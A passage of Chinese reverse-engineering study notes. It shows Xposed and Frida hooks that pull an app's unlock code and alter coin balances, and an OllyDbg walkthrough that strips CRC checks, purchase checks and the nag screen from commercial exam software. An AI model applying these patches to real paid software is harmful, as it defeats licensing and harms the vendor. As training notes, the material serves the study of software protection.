%}\n\n发现有好多a，这里应该是做了简单混淆。那就一个个来看吧。\n\n{% asset_img 12.3.png 简单混淆 %}\n\n`com.hfdcxy.android.by.a`包中有一个类a，其中有一个方法a和一个属性a。`a.a.a`的作用是输出Log语句。\n\n```java\npackage com.hfdcxy.android.by.a;\nimport android.util.Log;\npublic class a {//类a\n    private static boolean a;//属性a\n\n    static {\n        a.a = false;//属性a一开始为false\n    }\n\n    public static void a(String arg1) {//方法a\n        if(a.a) {//如果属性a为true，输出Log\n            Log.i(\"Tiger_test\", arg1);\n        }\n    }\n}\n```\n\n`com.hfdcxy.android.by.test`包中有一个类a，其中有一个方法a。`test.a.a`的作用是MD5加密。\n\n```java\npackage com.hfdcxy.android.by.test;\nimport java.security.MessageDigest;\npublic class a {//类a\n    public static String a(String arg6) {//方法a\n        MessageDigest v2;\n        int v1 = 0;\n        try {\n            v2 = MessageDigest.getInstance(\"MD5\");\n        }\n        catch(Exception v0) {\n            System.out.println(v0.toString());\n            v0.printStackTrace();\n            String v0_1 = \"\";\n            return v0_1;\n        }\n\n        char[] v3 = arg6.toCharArray();\n        byte[] v4 = new byte[v3.length];\n        int v0_2;\n        for(v0_2 = 0; v0_2 < v3.length; ++v0_2) {\n            v4[v0_2] = ((byte)v3[v0_2]);\n        }\n\n        byte[] v0_3 = v2.digest(v4);\n        StringBuffer v2_1 = new StringBuffer();\n        while(v1 < v0_3.length) {\n            int v3_1 = v0_3[v1] & 255;\n            if(v3_1 < 16) {\n                v2_1.append(\"0\");\n            }\n\n            v2_1.append(Integer.toHexString(v3_1));\n            ++v1;\n        }\n\n        return v2_1.toString();\n    }\n}\n```\n\n因为解锁成功与否的过程没用到`b.a`，暂时先不分析它。\n\n重新看这条关键代码，它的意思是v0等于当前手机的`android_id`经过MD5加密后与固定字符串`hfdcxy1011`进行拼接后再进行一次MD5加密得到的值截取前6位。\n\n```java\nString v0 = a.a(a.a(Settings$System.getString(this.a.getContentResolver(), \"android_id\")) + \"hfdcxy1011\").substring(0, 6);\n```\n\n这里有三种方式可以把这个解锁码打印出来：\n\n(1)我们知道`test.a.a`方法是最后一层加密，我们可以hook这个a方法把它的返回值打印出来，然后取其前6位为解锁码；\n\n(2)因为整个apk只有一处对`substring`的调用，我们可以hook系统函数`substring`把函数返回值打印出来；\n\n(3)通过分析知道`a.a.a`方法为log打印的方法，我们可以hook这个a方法的参数，把解锁码通过Log打印出来。\n\n这里取第一种。\n\n方法的包名+类名：com.hfdcxy.android.by.test.a\n方法名：a\n方法的参数类型：String\n\n过滤下包名防止Xposed找不到包名对应的类报错，这里的包名是`manifest`标签下的包名`com.ss.android.ugc.aweme`。\n\n{% asset_img 12.4.png 包名 %}\n\n在第11节程序里面的hook类编写hook代码。就是模板，往里塞参数就行。\n\n{% asset_img 12.5.png hook代码 %}\n\n连上模拟器，安装app，Xposed Installer勾选相应程序模块，重启模拟器。运行`解锁程序.apk`，随意输入解锁码，点击解锁。回到AS搜索Log。\n\n{% asset_img 12.6.png Logcat %}\n\n因为`test.a.a`共调用了两次，第一次`MD5(android_id)`，第二次`MD5(MD5(android_id)+hfdcxy1011)`，取最后一次的前6位才是解锁码116f58。\n\n输入解锁码，进入充值页面。\n\n{% asset_img 12.7.png 解锁成功 %}\n\n点几下充值金币，再点开启宝箱，发现金币不足。回jeb继续分析代码。我们已经进入“解锁成功”的代码里去，看到里面调用了`DrawActivity`类。\n\n{% asset_img 12.8.png DrawActivity %}\n\n进去看看。\n\n{% asset_img 12.9.png DrawActivity %}\n\n也就是需要点击9999次才能开启宝箱，达咩！我们的思路是直接hook第一个按钮，修改`test.b.a`方法，使按一次就有10000金币。\n\n```java\npackage com.hfdcxy.android.by.test;\nimport android.content.SharedPreferences$Editor;\nimport android.content.SharedPreferences;\nimport android.widget.TextView;\npublic class b {//类b\n    public b() {\n        super();\n    }\n\n    public void a(SharedPreferences arg5, TextView arg6, int arg7) {//方法a，arg7是点击一次增加的金币数\n        SharedPreferences$Editor v0 = arg5.edit();\n        v0.putInt(\"coin\", arg5.getInt(\"coin\", 0) + arg7);\n        v0.commit();\n        arg6.setText(String.valueOf(arg5.getInt(\"coin\", 0)));\n    }\n}\n```\n\n方法的包名+类名：com.hfdcxy.android.by.test.b\n方法名：a\n方法的参数类型：SharedPreferences、TextView、int\n\n编写hook代码：\n\n{% asset_img 12.10.png hook代码 %}\n\n同样操作走一次，开启宝箱。\n\n{% asset_img 12.12.png 开启宝箱 %}\n\n{% asset_img 12.11.png 开启宝箱 %}\n\n我们可以尝试一下获取解锁码的第二第三种方法。\n\n第二种：`substring`是一个Java系统内部的方法，百度搜一下它的构造方法。\n\n```java\npublic String substring(int beginIndex)\n\n或\n\npublic String substring(int beginIndex, int endIndex)\n```\n\n方法的包名+类名：java.lang.String\n方法名：substring\n方法的参数类型：int、int\n\n编写Xpose代码：\n\n{% asset_img 12.14.png xpose代码 %}\n\n{% asset_img 12.13.png 解锁码 %}\n\n哈哈哈好像不止一个，但很容易知道哪个是解锁码，但是下面这样写是不行。\n\n方法的包名+类名：com.hfdcxy.android.by.test.a.a\n方法名：substring\n方法的参数类型：int、int\n\n第三种：通过`a.a.a`方法打印Log。因为v0是解锁码的前6位，刚好下一行就是Log输出v0的代码。\n\n```java\nString v0 = a.a(a.a(Settings$System.getString(this.a.getContentResolver(), \"android_id\")) + \"hfdcxy1011\").substring(0, 6);\ncom.hfdcxy.android.by.a.a.a(\"解锁码\" + v0);\n```\n\n方法的包名+类名：com.hfdcxy.android.by.a.a\n方法名：a\n方法的参数类型：String\n\n{% asset_img 12.15.png 解锁码 %}\n\n# 13. Xpose实战2\n\n目标：hook修改极品美女找茬游戏中的金币余额为999。\n\n运行apk，每次评论或分享都可以获得50金币。\n\n{% asset_img 13.1.png 找茬求助界面 %}\n\nAK查看apk，manifest标签的包名为com.jimmy.beauty.pick，application标签添加android_debugable=\"true\"。\n\njeb中在smali代码中搜索“金币”，发现它在SOSActivity中。\n\n{% asset_img 13.2.png 100金币 %}\n\n进入SOSActivity反编译成Java代码，在某个case中发现CommentActivity。\n\n{% asset_img 13.3.png SOSActivity %}\n\n继续进去CommentActivity看看。有个按钮事件，一个是“现在去给”评价，另一个是“以后再说”。修改的思路是将giveComment方法放到“以后再说”，再将giveComment方法里的前3行都去掉，因为那几行代码是构造支付链接。这些都是在AK中修改smali代码完成的。\n\n{% asset_img 13.4.png giveComment %}\n\n进去setMoney方法，一个参数为Context类型，一个参数为int类型。\n\n{% asset_img 13.5.png setMoney %}\n\n此时可以hook这个setMoney方法了。\n\n{% asset_img 13.6.png hook代码 %}\n\n连上模拟器，安装app，Xposed Installer勾选相应程序模块，重启模拟器。运行程序，开一局游戏，求助 -> 评论 -> 以后再说，就可以获得999金币！\n\n{% asset_img 13.7.png hook代码 %}\n\n# 14. adb注意事项\n\n每次打开AS模拟器都会弹出如下图所示的错误：\n\n{% asset_img 14.1.png 错误 %}\n\n是因为5037端口被占用了。在cmd输入` netstat -ano|findstr \"5037\"`查看被哪个进程占用。\n\n```\nC:\\Users\\dell>netstat -ano|findstr \"5037\"\n  TCP    [::1]:3425             [::1]:5037             SYN_SENT        18760\n```\n\n输入`taskkill -f -pid 18760`杀死相应的进程。\n\n# 15. Native层hook\n\n本来想安装Cydia Substrate的，结果这个软件很久没更新了，最高只支持安卓系统4.3的，模拟器和近几年的真机都安装不了，所以换了另一个框架Frida。\n\n[Frida超详细安装实战教程](https://www.52pojie.cn/thread-1128884-1-1.html)\n\n## 15.1 Frida hook java\n\n```python\nimport frida  #导入frida模块\nimport sys    #导入sys模块\n\njscode = \"\"\"  #从此处开始定义用来Hook的javascript代码\n    Java.perform(function(){  \n        var MainActivity = Java.use('com.example.testfrida.MainActivity'); //获得MainActivity类\n        MainActivity.testFrida.implementation = function(){ //Hook testFrida函数，用js自己实现\n            send('Statr! Hook!'); //发送信息，用于回调python中的函数\n            return 'Change String!' //劫持返回值，修改为我们想要返回的字符串\n        }\n    });\n\"\"\"\n\ndef on_message(message,data): #js中执行send函数后要回调的函数\n    print(message)\n\nprocess = frida.get_remote_device().attach('com.example.testfrida') #得到设备并劫持进程com.example.testfrida（该开始用get_usb_device函数用来获取设备，但是一直报错找不到设备，改用get_remote_device函数即可解决这个问题）\nscript = process.create_script(jscode) #创建js脚本\nscript.on('message',on_message) #加载回调函数，也就是js中执行send函数规定要执行的python函数\nscript.load() #加载脚本\nsys.stdin.read()\n```\n\n## 15.2 Frida hook 返回值为int类型\n\n```python\nimport frida\nimport sys\n\njscode = \"\"\"\nJava.perform(function(){\n    //下面这一句代码是指定要Hook的so文件名和要Hook的函数名，函数名就是上面IDA导出表中显示的那个函数名\n    Interceptor.attach(Module.findExportByName(\"libfridaso.so\",\"Java_com_example_fridaso_FridaSoDefine_FridaSo\"),{\n        //onEnter: function(args)顾名思义就是进入该函数前要执行的代码，其中args是传入的参数，一般so层函数第一个参数都是JniEnv，第二个参数是jclass，从第三个参数开始才是我们java层传入的参数\n        onEnter: function(args) {\n            send(\"Hook start\");\n            send(\"args[2]=\" + args[2]); //打印我们java层第一个传入的参数\n            send(\"args[3]=\" + args[3]); //打印我们java层传入的第二个参数\n        },\n        onLeave: function(retval){ //onLeave: function(retval)是该函数执行结束要执行的代码，其中retval参数即是返回值\n            send(\"return:\"+retval); //打印返回值\n            retval.replace(0); //替换返回值为0\n        }\n    });\n});\n\"\"\"\ndef printMessage(message,data):\n    if message['type'] == 'send':\n        print('{0}'.format(message['payload']))\n    else:\n        print(message)\n\nprocess = frida.get_remote_device().attach('com.example.fridaso')\nscript = process.create_script(jscode)\nscript.on('message',printMessage)\nscript.load()\nsys.stdin.read()\n```\n\n## 15.3 Frida hook 返回值为String类型\n\n```python\nimport frida\nimport sys\n\njscode = \"\"\"\nJava.perform(function(){\n    Interceptor.attach(Module.findExportByName(\"libfridaso.so\",\"Java_com_example_fridasostring_fridaSoString_FridaSo\"),{\n        onEnter: function(args) {\n            send(\"Hook start\");\n            send(\"args[2]=\" + args[2]);\n        },\n        onLeave: function(retval){\n            send(\"return:\"+retval);\n            var env = Java.vm.getEnv(); //获取env对象，也就是native函数的第一个参数\n            var jstrings = env.newStringUtf(\"tamper\"); //因为返回的是字符串指针，使用我们需要构造一个newStringUtf对象，用来代替这个指针\n            retval.replace(jstrings); //替换返回值\n        }\n    });\n});\n\"\"\"\ndef printMessage(message,data):\n    if message['type'] == 'send':\n        print('{0}'.format(message['payload']))\n    else:\n        print(message)\n\nprocess = frida.get_remote_device().attach('com.example.fridasostring')\nscript = process.create_script(jscode)\nscript.on('message',printMessage)\nscript.load()\nsys.stdin.read()\n```\n\n## 15.4. Native hook实战\n\n[攻防世界 ill-intentions](https://v5le0n9.github.io/posts/9f62af2.html#20-ill-intentions)\n\n","categories":["Android逆向"],"tags":["Java","IDA","Android Killer","吾爱破解培训"]},{"title":"吾爱破解学习指导教程","url":"/posts/f398dcca.html","content":"\nNO.1~NO.3在[第一课——脱壳基础](https://v5le0n9.github.io/posts/e2d652c5.html)就已经实践完了，所以这个笔记从NO.4开始。这个笔记是在[调试器使用教程](https://v5le0n9.github.io/posts/33a085c7.html)的基础上讲解，所以一定要保证自己已经了解OD的基本操作才推荐看这个笔记，但绝对会比论坛的大牛们讲解的详细。\n\n<!--more-->\n\n# NO.4 破解实战\n\n由于我是用户大牛在讲解的帖子上没有附上实验程序的下载链接，所以只能挑附上下载链接的进行详细记录，没有附上下载链接的只能讲解流程，详细请看我是用户的帖子。\n\n## 第一战：超级U盘锁\n\nhttps://www.52pojie.cn/thread-197281-1-1.html\n\nASPack壳+两处自校验+跳转爆破/赋值爆破\n\n## 第二战：豪杰屏幕录像机 v2.0\n\nhttp://www.52pojie.cn/thread-197598-1-1.html\n\n修改DLL\n\n## 第三战：LukoolRecorder2.7.5cn\n\nhttps://www.52pojie.cn/thread-197957-1-1.html\n\n明码比较+跳转爆破/赋值爆破\n\n## 第四战：PilotEdit5.9\n\nhttps://www.52pojie.cn/thread-198203-1-1.html\n\n跳转爆破\n\n## 第五战：文件夹加密精灵V5.3\n\nhttps://www.52pojie.cn/thread-198365-1-1.html\n\n重启验证+跳转爆破+算法分析(MD5+程序加密算法)\n\n## 第六战：(帖子被删除了)\n\n## 第七战：XX注册税务师考试锦囊(完)\n\nhttps://www.52pojie.cn/thread-199459-1-1.html\n\nMPRESS壳+CRC相互校验+浮点错误+爆破+去除NAG\n\n先运行一下程序，单独打开`ESIExamPlatform.exe`(主程序)是运行不了的，需要打开`ESPlatform.exe`再让它自行启动`ESIExamPlatform.exe`。查壳，两个都有MPRESS壳。\n\n先解决两个程序的脱壳问题。这是个压缩壳，用ESP定律秒脱。脱完名字要改为原程序的名字。脱完壳后两个程序都显示CRC校验失败。\n\n{% asset_img 4.7.2.png CRC校验失败 %}\n\n载入`ESIExamPlatform.exe`搜索字符串把它跳过。\n\n```asm\n00419DA1   . /7C 1C         jl short ESIExamP.00419DBF;nop掉\n00419DA3   . |68 206D4A00   push ESIExamP.004A6D20                   ;  495\n00419DA8   . |50            push eax\n00419DA9   . |E8 B4A40500   call ESIExamP.00474262\n00419DAE   . |83C4 08       add esp,0x8\n00419DB1   . |85C0          test eax,eax\n00419DB3   . |74 0A         je short ESIExamP.00419DBF;nop掉\n00419DB5   . |2B4424 14     sub eax,dword ptr ss:[esp+0x14]\n00419DB9   . |D1F8          sar eax,1\n00419DBB   . |3BC6          cmp eax,esi\n00419DBD   . |75 62         jnz short ESIExamP.00419E21;改为jmp\n00419DBF   > \\6A 00         push 0x0\n00419DC1   .  6A 00         push 0x0\n00419DC3   .  68 286D4A00   push ESIExamP.004A6D28                   ;   《考试锦囊》CRC校验失败，请杀毒后重新下载本系统！\n00419DC8   .  E8 02FB0300   call ESIExamP.004598CF\n```\n\n载入`ESPlatform.exe`搜索字符串把它跳过。\n\n```asm\n004015DF     /74 22         je short ESPlatfo.00401603;nop掉\n004015E1     |8B4424 20     mov eax,dword ptr ss:[esp+0x20]          ;  kernel32.7C839AD8\n004015E5     |8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0\n004015E9     |7C 18         jl short ESPlatfo.00401603;nop掉\n004015EB     |51            push ecx\n004015EC     |50            push eax\n004015ED     |E8 727F0200   call ESPlatfo.00429564\n004015F2     |83C4 08       add esp,0x8\n004015F5     |85C0          test eax,eax\n004015F7     |74 0A         je short ESPlatfo.00401603;nop掉\n004015F9     |2B4424 20     sub eax,dword ptr ss:[esp+0x20]          ;  kernel32.7C839AD8\n004015FD     |D1F8          sar eax,1\n004015FF     |3BC6          cmp eax,esi\n00401601     |75 3E         jnz short ESPlatfo.00401641;改为jmp\n00401603     \\6A 00         push 0x0\n00401605      6A 00         push 0x0\n00401607      68 00934400   push ESPlatfo.00449300                   ;   《考试锦囊》CRC校验失败，请杀毒后重新下载本系统！\n0040160C  |.  E8 2FCD0000   call ESPlatfo.0040E340\n```\n\n此时单独运行`ESIExamPlatform.exe`会出现异常。\n\n{% asset_img 4.7.1.png 应用程序发生异常 %}\n\n再次载入OD，找到`4757CA`，在`4757C5`下断，进入函数。\n\n```asm\n004757C5  |.  E8 D8F4FFFF   call ESIExamP.00474CA2\n004757CA  |.  83C4 14       add esp,0x14\n```\n\n```asm\n00474C56  |.  FF15 44B34900 call dword ptr ds:[<&kernel32.#IsSystemResum>; [IsDebuggerPresent\n00474C5C  |.  6A 00         push 0x0                                     ; /pTopLevelFilter = NULL\n00474C5E  |.  8BD8          mov ebx,eax                                  ; |\n00474C60  |.  FF15 48B14900 call dword ptr ds:[<&kernel32.#SetVolumeMoun>; \\SetUnhandledExceptionFilter\n00474C66  |.  8D85 28FDFFFF lea eax,[local.182]\n00474C6C  |.  50            push eax                                     ; /pExceptionInfo = 00124C88\n00474C6D  |.  FF15 44B14900 call dword ptr ds:[<&kernel32.#UnregisterWai>; \\UnhandledExceptionFilter\n```\n\n程序运行到`UnhandledExceptionFilter`处出错。因为这个函数前面没有跳转指令，所以要返回到父函数寻找跳转指令绕过这个子函数。\n\n```asm\n004757AD  |. /74 07         je short ESIExamP.004757B6;绕过循环跳转就必须jmp,但同时异常也会被执行\n004757AF  |. |8B5D 0C       mov ebx,[arg.2]\n004757B2  |. |3BDF          cmp ebx,edi\n004757B4  |. |77 1E         ja short ESIExamP.004757D4;这个跳转实现虽然绕过异常，但一直在循环，直到不循环时也是要执行异常\n004757B6  |> \\E8 BB2D0000   call ESIExamP.00478576\n004757BB  |.  6A 16         push 0x16\n004757BD  |.  5E            pop esi                                      ;  ESIExamP.0047BEE6\n004757BE  |.  8930          mov dword ptr ds:[eax],esi\n004757C0  |>  57            push edi;这个跳过来的是个jmp指令，没办法不执行，改nop也不行\n004757C1  |.  57            push edi\n004757C2  |.  57            push edi\n004757C3  |.  57            push edi\n004757C4  |.  57            push edi\n004757C5  |.  E8 D8F4FFFF   call ESIExamP.00474CA2;异常函数\n```\n\n所以这两个跳转无论如何都不能够使这个异常不实现，继续找父函数。在堆栈窗口找到返回地址跟随。\n\n```asm\n00124F84  |0041B9E7  返回到 ESIExamP.0041B9E7 来自 ESIExamP.0047579E\n```\n\n发现可以利用`0041B9D4`的跳转指令绕过异常函数。\n\n```asm\n0041B9D4  |. /74 14         je short ESIExamP.0041B9EA;改为jmp\n0041B9D6  |. |68 84744A00   push ESIExamP.004A7484                       ;  s\n0041B9DB  |. |6A 01         push 0x1\n0041B9DD  |. |68 FFFFFF00   push 0xFFFFFF\n0041B9E2  |. |E8 B79D0500   call ESIExamP.0047579E;异常函数\n0041B9E7  |. |83C4 0C       add esp,0xC\n0041B9EA  |> \\8D8C24 900000>lea ecx,dword ptr ss:[esp+0x90]\n```\n\n发现单独运行它又弹出一连串的“CRC校验失败，请重新下载本软件”的对话框。搜索字符串，在函数开头下断运行，发现`0043DB14`能绕过弹窗，`0043DB94`不能，因为je指令会绕过jnz指令。所以要在`0043DB14`改为jmp。\n\n```asm\n0043DB14  |. /0F84 C0000000 je ESIExamP.0043DBDA;改为jmp\n...\n0043DB89  |. /74 0B         je short ESIExamP.0043DB96\n0043DB8B  |. |2B4424 14     sub eax,dword ptr ss:[esp+0x14]\n0043DB8F  |. |D1F8          sar eax,1\n0043DB91  |. |83F8 FF       cmp eax,-0x1\n0043DB94  |. |75 1A         jnz short ESIExamP.0043DBB0\n0043DB96  |> \\6A 00         push 0x0\n0043DB98  |.  6A 00         push 0x0\n0043DB9A  |.  68 F4EF4A00   push ESIExamP.004AEFF4                   ;  程序CRC校验失败，请重新下载本软件!\n0043DB9F  |.  E8 2BBD0100   call ESIExamP.004598CF\n```\n\n但这样改就会跳转到“程序不完整”。\n\n```asm\n0043DBDA  |> \\8B4E 20       mov ecx,dword ptr ds:[esi+0x20]\n0043DBDD  |.  6A 65         push 0x65                                ; /TimerID = 65 (101.)\n0043DBDF  |.  51            push ecx                                 ; |hWnd = 494F6396\n0043DBE0  |.  FF15 D8B54900 call dword ptr ds:[<&user32.#435>]       ; \\KillTimer\n0043DBE6  |.  6A 00         push 0x0\n0043DBE8  |.  6A 00         push 0x0\n0043DBEA  |.  68 1CF04A00   push ESIExamP.004AF01C                   ;  程序不完整，请重新下载!\n0043DBEF  |.  E8 DBBC0100   call ESIExamP.004598CF\n```\n\n重新修改：\n\n```asm\n0043DB77  |. /7C 1D         jl short ESIExamP.0043DB96;nop掉\n0043DB79  |. |68 206D4A00   push ESIExamP.004A6D20                   ;  495\n0043DB7E  |. |50            push eax\n0043DB7F  |. |E8 DE660300   call ESIExamP.00474262\n0043DB84  |. |83C4 08       add esp,0x8\n0043DB87  |. |85C0          test eax,eax\n0043DB89  |. |74 0B         je short ESIExamP.0043DB96;nop掉\n0043DB8B  |. |2B4424 14     sub eax,dword ptr ss:[esp+0x14]\n0043DB8F  |. |D1F8          sar eax,1\n0043DB91  |. |83F8 FF       cmp eax,-0x1\n0043DB94  |. |75 1A         jnz short ESIExamP.0043DBB0;修改为jmp\n0043DB96  |> \\6A 00         push 0x0\n0043DB98  |.  6A 00         push 0x0\n0043DB9A  |.  68 F4EF4A00   push ESIExamP.004AEFF4                   ;  程序CRC校验失败，请重新下载本软件!\n0043DB9F  |.  E8 2BBD0100   call ESIExamP.004598CF\n0043DBA4  |.  8B16          mov edx,dword ptr ds:[esi]               ;  ESIExamP.004AF6BC\n0043DBA6  |.  8B82 5C010000 mov eax,dword ptr ds:[edx+0x15C]\n0043DBAC  |.  8BCE          mov ecx,esi\n0043DBAE  |.  FFD0          call eax\n0043DBB0  |>  C68424 880000>mov byte ptr ss:[esp+0x88],0x2\n0043DBB8  |.  8B4424 14     mov eax,dword ptr ss:[esp+0x14]\n0043DBBC  |.  83C0 F0       add eax,-0x10\n0043DBBF  |.  8D48 0C       lea ecx,dword ptr ds:[eax+0xC]\n0043DBC2  |.  83CA FF       or edx,-0x1\n0043DBC5  |.  f0:0fc111     lock xadd dword ptr ds:[ecx],edx\n0043DBC9  |.  4A            dec edx\n0043DBCA  |.  85D2          test edx,edx\n0043DBCC  |.  7F 3D         jg short ESIExamP.0043DC0B;修不修改终将会绕过“程序不完整”弹窗\n0043DBCE  |.  8B08          mov ecx,dword ptr ds:[eax]               ;  ESIExamP.004C8790\n0043DBD0  |.  8B11          mov edx,dword ptr ds:[ecx]\n0043DBD2  |.  50            push eax\n0043DBD3  |.  8B42 04       mov eax,dword ptr ds:[edx+0x4]\n0043DBD6  |.  FFD0          call eax\n0043DBD8  |.  EB 31         jmp short ESIExamP.0043DC0B\n0043DBDA  |>  8B4E 20       mov ecx,dword ptr ds:[esi+0x20]\n0043DBDD  |.  6A 65         push 0x65                                ; /TimerID = 65 (101.)\n0043DBDF  |.  51            push ecx                                 ; |hWnd = 00B1AF3C\n0043DBE0  |.  FF15 D8B54900 call dword ptr ds:[<&user32.#435>]       ; \\KillTimer\n0043DBE6  |.  6A 00         push 0x0\n0043DBE8  |.  6A 00         push 0x0\n0043DBEA  |.  68 1CF04A00   push ESIExamP.004AF01C                   ;  程序不完整，请重新下载!\n0043DBEF  |.  E8 DBBC0100   call ESIExamP.004598CF\n```\n\n运行`ESPlatform.exe`可以正常启动`ESIExamPlatform.exe`出现主程序，单独启动`ESIExamPlatform.exe`也可出现主程序。至此，CRC校验全被清除。\n\n在主程序点击一下功能看程序是否能正常工作。发现在点击“答题记录”或“统计曲线”或“习题集”时出现错误提示框，然后直接退出程序。\n\n{% asset_img 4.7.3.png 浮点数错误 %}\n\n这是因为代码调用了浮点数，而程序在启动时因为缺省没有调用初始化浮点数的函数。程序启动阶段`___tmainCRTStartup`函数中调用了`__cinit`函数，在这个函数的第一个判断是校验浮点运算初始化函数指针所处的section是否为可写，如果可写的话就跳过浮点运算初始化函数，因此缺省情况下会直接显示出错信息并退出，如果该区段不可写，代码会调用浮点运算初始化函数，缺省的指向出错函数的指针会被替换成正常处理函数，因此可以正常运算。\n\n又因为它会退出程序，Ctrl+G搜索`ExitProcess`下断，按下“统计曲线”->确定，程序停在断点处。在堆栈窗口返回到父函数。不断堆栈回溯再跟进来到这，看到下面有个`WriteFile`函数，说明`.MPRESS1`区段可写。\n\n```asm\n0047BC3C  |> \\68 10200100   push 0x12010\n0047BC41  |.  68 60174A00   push ESIExamP.004A1760                                   ;  Microsoft Visual C++ Runtime Library\n0047BC46  |.  57            push edi\n0047BC47  |.  E8 A4EF0000   call ESIExamP.0048ABF0                                   ;  错误函数\n0047BC4C  |.  83C4 0C       add esp,0xC\n0047BC4F  |.  EB 32         jmp short ESIExamP.0047BC83\n0047BC51  |>  6A F4         push -0xC                                                ; /DevType = STD_ERROR_HANDLE\n0047BC53  |.  FF15 80B14900 call dword ptr ds:[<&kernel32.#GetStringTypeExA_433>]    ; \\GetStdHandle\n0047BC59  |.  8BD8          mov ebx,eax\n0047BC5B  |.  3BDE          cmp ebx,esi\n0047BC5D  |.  74 24         je short ESIExamP.0047BC83\n0047BC5F  |.  83FB FF       cmp ebx,-0x1\n0047BC62  |.  74 1F         je short ESIExamP.0047BC83\n0047BC64  |.  6A 00         push 0x0\n0047BC66  |.  8D45 F8       lea eax,[local.2]\n0047BC69  |.  50            push eax\n0047BC6A  |.  8D34FD 246B4C>lea esi,dword ptr ds:[edi*8+0x4C6B24]                    ;  R6002\\r\\n- floating point support not loaded\\r\\n\n0047BC71  |.  FF36          push dword ptr ds:[esi]\n0047BC73  |.  E8 982A0000   call ESIExamP.0047E710\n0047BC78  |.  59            pop ecx                                                  ; |ESIExamP.004754A8\n0047BC79  |.  50            push eax                                                 ; |nBytesToWrite = 0x0\n0047BC7A  |.  FF36          push dword ptr ds:[esi]                                  ; |Buffer = NULL\n0047BC7C  |.  53            push ebx                                                 ; |hFile = 00124EFC\n0047BC7D  |.  FF15 4CB34900 call dword ptr ds:[<&kernel32.#WritePrivateProfileString>; \\WriteFile\n0047BC83  |>  5F            pop edi                                                  ;  ESIExamP.004754A8\n0047BC84  |.  5E            pop esi                                                  ;  ESIExamP.004754A8\n0047BC85  |.  5B            pop ebx                                                  ;  ESIExamP.004754A8\n0047BC86  |.  C9            leave\n0047BC87  \\.  C3            retn\n```\n\n将`.MPRESS1`区段改为不可写显然不现实，因为程序不止这一处是写入的，那就只能强制初始化。载入IDA查看`__cinit`函数，发现它有` __IsNonwritableInCurrentImage`函数，用来判断地址是否可写，不能写则调用`__fpmath`(call off_4A11A8)进行初始化。 \n\n{% asset_img 4.7.4.png 浮点数错误 %}\n\n回到OD修改`475561`和`475570`地址的`jz`指令改为`nop`。\n\n```asm\n00475561     /74 19         je short ESIExamP.0047557C;nop掉\n00475570     /74 0A         je short ESIExamP.0047557C;nop掉\n```\n\n习题集、统计曲线等等都可以正常打开了。\n\n接着爆破。最终目的是能bp试卷，所以找到两处购买试题的地方，可知标志位保存在`ebx+0x15C`中。\n\n```asm\n0043032E   > \\83BB 5C010000>cmp dword ptr ds:[ebx+0x15C],0x0\n00430335   .  0F85 A5000000 jnz ESIExamP.004303E0\n0043033B   .  8D8B CC050000 lea ecx,dword ptr ds:[ebx+0x5CC]\n00430341   .  51            push ecx\n00430342   .  8D95 B0F8FFFF lea edx,dword ptr ss:[ebp-0x750]\n00430348   .  68 78CB4A00   push ESIExamP.004ACB78                   ;  &nbsp;&nbsp;&nbsp;<a href=\n0043034D   .  52            push edx                                 ;  ntdll.KiFastSystemCallRet\n0043034E   .  E8 3D56FDFF   call ESIExamP.00405990\n00430353   .  83C4 0C       add esp,0xC\n00430356   .  68 28CB4A00   push ESIExamP.004ACB28                   ;  ><font color=red>未购买该试题 点击购买</font></a>\n```\n\n```asm\n00430B14   .  83BB 5C010000>cmp dword ptr ds:[ebx+0x15C],0x0\n00430B1B   .  0F85 9C000000 jnz ESIExamP.00430BBD\n00430B21   .  8D8B CC050000 lea ecx,dword ptr ds:[ebx+0x5CC]\n00430B27   .  51            push ecx\n00430B28   .  8D95 90F8FFFF lea edx,dword ptr ss:[ebp-0x770]\n00430B2E   .  68 C4CC4A00   push ESIExamP.004ACCC4                   ;  <a href=\n00430B33   .  52            push edx                                 ;  ntdll.KiFastSystemCallRet\n00430B34   .  E8 574EFDFF   call ESIExamP.00405990\n00430B39   .  83C4 0C       add esp,0xC\n00430B3C   .  68 28CB4A00   push ESIExamP.004ACB28                   ;  ><font color=red>未购买该试题 点击购买</font></a>\n```\n\n修改方法有两种：\n\n1. 查找参考->地址常量，找到所有`cmp dword ptr ds:[ecx+0x15C],0x0 `，修改其下面的跳转指令；\n2. 查找参考->地址常量，找到所有给[ebx+0x15C]赋值的地方，修改其赋值。\n\n选择哪一个比较好视工作量而定，肯定是哪个修改量少修改哪个。\n\n我觉得在这程序里第一种方法工作量比较小。修改完后已经没有“购买试题”的字样了，但NAG窗口还在。搜索字符串先将这里修改了，试题我都bp了，怎么能说我没注册呢！\n\n```asm\n0043E6A2     /74 66         je short ESIExamP.0043E70A               ;  nop掉\n0043E6A4   . |68 8CF04A00   push ESIExamP.004AF08C                   ;  您已获得本套系统正版授权，谢谢您的支持！\n0043E6A9   . |68 24040000   push 0x424\n0043E6AE   . |8BCD          mov ecx,ebp\n0043E6B0   . |E8 A2270100   call ESIExamP.00450E57\n0043E6B5   . |8BC8          mov ecx,eax\n0043E6B7   . |E8 DB280100   call ESIExamP.00450F97\n0043E6BC   . |68 B8F04A00   push ESIExamP.004AF0B8                   ;  系统已经注册\n0043E6C1   . |6A 01         push 0x1\n```\n\n接着去掉NAG窗口。在命令窗口下断`bp CreateDialogIndirectParamW`(CreateDialogIndirectParam是用于从内存中的对话框模板上创建一个无模式对话框的函数)。第一次F9运行至断点处，第二次F9出现主程序，第三次F9出现NAG。所以要在第二次F9到第三次F9之间找到绕过NAG窗口的指令。\n\n在第二次F9后，一路F8，运行到这一句时弹出NAG窗口。(这里前面有个可以绕过`call`指令的跳转指令，但是不能将它改为`jmp`，因为你会发现这个`call`指令被运行了两次，第一次是主程序，第二次才是NAG)\n\n```asm\n00452936     /74 1E         je short ESIExamP.00452956\n00452938   . |6A 04         push 0x4\n0045293A   . |5F            pop edi\n0045293B   . |8BCE          mov ecx,esi\n0045293D   . |E8 C9E5FFFF   call ESIExamP.00450F0B\n00452942   . |A9 00010000   test eax,0x100\n00452947   . |74 03         je short ESIExamP.0045294C\n00452949   . |6A 05         push 0x5\n0045294B   . |5F            pop edi\n0045294C   > |57            push edi\n0045294D   . |8BCE          mov ecx,esi\n0045294F   . |E8 B8270000   call ESIExamP.0045510C                   ;  第一次主程序，第二次NAG窗口\n00452954   . |33FF          xor edi,edi\n00452956   > \\397E 20       cmp dword ptr ds:[esi+0x20],edi     \n```\n\n在堆栈窗口找到这句反汇编窗口跟随。(主程序与NAG“返回到”的地址不同)\n\n```asm\n00124ED0   0043835E  返回到 ESIExamP.0043835E 来自 